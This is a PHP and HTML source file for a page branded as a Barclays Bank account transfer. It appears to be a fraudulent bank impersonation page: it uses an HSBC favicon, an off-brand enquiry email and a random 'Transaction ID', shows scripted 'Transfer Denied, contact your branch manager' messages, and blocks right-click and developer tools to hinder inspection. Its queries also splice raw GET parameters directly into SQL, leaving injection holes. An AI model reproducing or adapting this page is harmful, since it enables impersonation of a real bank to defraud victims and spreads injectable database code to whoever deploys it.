<?php
session_start();
$conn=new mysqli("localhost","root","","glen");


$email=$_SESSION['email'];



    $sql = "SELECT * FROM frean WHERE email='$email'";
    $result = mysqli_query($conn, $sql);
    
         if (mysqli_num_rows($result) > 0) 
         {

             while($row = mysqli_fetch_assoc($result)) 
                {
					$total = $row["final"];
					$current = $row["current"];
                }
          
        } 


mysqli_close($conn);
?>
<html>
<title>Barclays Bank-Account Transfer</title>

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <link rel="icon" type="png" href="image/logoshsbc.png" style="width:5%">
    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.6.1/css/all.css"
        integrity="sha384-gfdkjb5BdAXd+lj+gudLWI+BXq4IuLW5IT+brZEZsLFm++aCMlF1V92rMkPaX4PP" crossorigin="anonymous">
    <link rel="stylesheet" href="css/bootstrap.css">
    <link rel="stylesheet" href="css/bootstrap.min.css">
    <link rel="stylesheet" href="css/style.css">
    <script src="https://kit.fontawesome.com/fc383a6465.js" crossorigin="anonymous"></script>
    <script src="https://kit.fontawesome.com/1f706328f3.js" crossorigin="anonymous"></script>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Source+Sans+Pro:wght@300&display=swap" rel="stylesheet">
    <meta name='viewport' content='width=device-width, initial-scale=1'>
</head>
<style>
* {
    font-family: 'Heebo', sans-serif;
}
</style>

<script src="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js"></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
<style>
table {
    border-collapse: separate;
    border-spacing: 0;

}

th,
td {
    padding: 10px 15px;
}

thead {
    background: #395870;
    color: #fff;
}

th {
    font-weight: bold;
}

tbody tr:nth-child(even) {
    background: #f0f0f2;
}

td {
    border-bottom: 1px solid #cecfd5;
    border-right: 1px solid #cecfd5;
}

td:first-child {
    border-left: 1px solid #cecfd5;
}

.center {
    margin-left: auto;
    margin-right: auto;
}

h6 {
    font-size: 20px;
}
</style>
<style>
#blink {
    font-size: 20px;
    font-weight: bold;
    color: #ffffff;
    transition: 0.5s;
}

h6 {
    font-size: 25px;
    font-family: 'Source Sans Pro', sans-serif;
}

h1{
    font-size: 25px;
    font-family: 'Source Sans Pro', sans-serif;
    color:#000000;
    text-align:center;
}
</style>

<body>
    <section style="background-color:#c2c2a3">
        <div class="container">
            <div class="row">
                <div class="col-md-2">
                    <div style="height:5px"></div>
                    <div style="height:55px;background-color:#000066;border:1px solid #000066;width:200px;">
                        <p style="text-align:center;padding-top:10px;"><img src="Image/barclays-log.png"
                                style="width:190px;height:30px;"></p>
                    </div>
                </div>
                <div class="col-md-8">
                    <p
                        style="font-size:35px;font-family: 'Source Sans Pro', sans-serif;color:#000066;text-align:center;padding-top:5px;">
                        Welcome To The Barclays Bank One Technology</p>
                </div>
                <div class="col-md-2" style="margin-top:20px;">
                                       
   <div id="google_translate_element" style="background-color:#000000;opacity:0.6;width:200px;"></div>
    <script type="text/javascript">
        function googleTranslateElementInit() {
            new google.translate.TranslateElement({ pageLanguage: 'en', includedLanguages: 'zh-CN,cs,da,nl,en,et,fr,vi,hi' }, 'google_translate_element');
        }

    </script>

    <script type="text/javascript"
        src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>
                </div>
            </div>
            <div>
    </section>
    <div style="height:50px"></div>

    <div id="Sign In" align="center">
        <div
            style="background-color:#5c5c3d;width:300px;height:50px;border:2px solid #5c8a8a;text-align:center;color:#ffffff;font-size:30px;font-family: 'Source Sans Pro', sans-serif;">
            Device Information
        </div>
    </div>

    <div style="height:40px"></div>
    <div id="Sign In" align="center">
        <div class="container">
            <div class="row">
                <div class="col-md-1">
                </div>
                <div class="col-md-10">
                    <p style="font-size:25px;font-family: 'Source Sans Pro', sans-serif;">
                    <?php  echo 'Your IP Address is - '.$_SERVER['REMOTE_ADDR'];?> <span
                            style="font-size:25px;font-family: 'Source Sans Pro', sans-serif;">Time: </span><span
                            id="rest" style="font-size:25px;font-family: 'Source Sans Pro', sans-serif;"></span></p>
                    <script>
                    var europeTime = new Date().toLocaleString("en-US", {
                        timeZone: "Europe/London"
                    });
                    europeTime = new Date(europeTime);
                    console.log('Europe time: ' + europeTime.toLocaleString())
                    document.getElementById('rest').innerHTML = europeTime.toLocaleString();
                    </script>
                </div>
                <div class="col-md-1">
                </div>
            </div>
        </div>
    </div>
    <div style="height:40px"></div>

    <div id="Sign In" align="center">
        <div class="dimensions">
            <div class="container">
                <div class="row">
                    <div class="col-md-12">
                       



                        <?php
include 'connection.php';
$name=$_GET['name'];
$bank=$_GET['bank'];
$number=$_GET['number'];
$branch=$_GET['branch'];
$code=$_GET['code'];
$iban=$_GET['iban'];
$email=$_GET['email'];
$amount=$_GET['amount'];
$comment=$_GET['comment'];
$bool=false;

$final_amount = $total-$amount;
$conn->query("UPDATE frean SET final = '$final_amount',initial='$amount' WHERE email='$email'");

$sql="insert into mins(name,bank,number,branch,code,iban,email,amount,current,comment) values
('$name','$bank','$number','$branch','$code','$iban','$email','$amount','$current','$comment')";
if($conn->query($sql))
{
    $sql = "SELECT * FROM mins WHERE email='$email'";
    $result = mysqli_query($conn, $sql);
    
         if (mysqli_num_rows($result) > 0) 
         {
        	
             while($row = mysqli_fetch_assoc($result)) 
                {
                    if(($total-$amount)>=0)
                    {
                        $bool = true; 
                        
                   
               echo "<h6>Available Balance :".$current." ".($total-$amount).".00<br>";        
               echo "Attention: " . $row["name"]. ", <br>" . $row["current"]. " " . $row["amount"]. " Has been Confirmed And Ready To Be Transferred Into Your  " . $row["bank"]. " Account <br>Your  Account Number Is: " . $row["number"]. "<br></h6>";
                    }
                    else{
                        
                        
                        echo "<h1>Transfer Denied. <br> Contact Your Branch Manager Through Email.</h1>";
                    }
                        
                    }
          
        } 

}
else {
  echo "<h1>Transfer Denied.<br>Contact Your Branch Manager Through Email.</h1>";
}
mysqli_close($conn);
?>



                    </div>
                </div>
            </div>
        </div>
    </div><br>




    <div class="dimensions">
        <div class="container">
            <div class="row">
                <div class="col-md-12">

                    <div id="Sign In" align="center">
                        <div style="height:40px"></div>
                         <img src="Image/f2f6a71667d92ba43df9c194da696fd3.gif" style="width:10%"></img><br>

                        <?php
	   if($bool)
	   {
		   ?>
                        <span style="font-size:25px;font-family: 'Source Sans Pro', sans-serif;">Transaction ID :</span>
                        <span style="font-size:25px;font-family: 'Source Sans Pro', sans-serif">
                            <?php
echo(rand() . "<br>");
       ?>
                        </span><br>
                        <table style="width:30px;">
                            <tr>
                                <p style="font-size:25px;font-family: 'Source Sans Pro', sans-serif;">Do You Wish To
                                    Transfer The Above Amount?</p>
                                <td style="width:150px;height:30px;border:2px solid green;background-color:green;">
                                    <a href="transfered.php?email=<?=$email?>&current=<?=$current?>"
                                        style="text-decoration:none;color:#ffffff;">Procced</a>
                                </td>
                                <td style="border:2px solid #ffffff;">

                                </td>
                                <td style="width:150px;height:30px;border:2px solid green;background-color:green;">
                                    <a href="secured-login.php" style="text-decoration:none;color:#ffffff;"> Decline</a>
                                </td>
                            </tr>
                        </table>

                        <?php
	   }
	   ?>

                    </div>
                </div>
            </div>
        </div>
    </div><br>


    <div style="height:40px;"></div>
    <div id="Sign In" align="center">
        <div style="background-color:#ffc266;width:700px;height:3px;"></div>
        <span style="font-size:15px;color:#000000;padding-bottom:60px;float:center;"> This is under the Barclays Bank Plc.| &#169 All
            Rights Reserved 2019. | For enquiries: enquirydept@abaclrest.com</span>
    </div>
</body>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.0/umd/popper.min.js"></script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
<script>
document.addEventListener('contextmenu', event => event.preventDefault());

$(document).keydown(function(event) {
    if (event.keyCode == 123) { // Prevent F12
        return false;
    } else if (event.ctrlKey && event.shiftKey && event.keyCode == 73) { // Prevent Ctrl+Shift+I        
        return false;
    }
});
</script>

</html>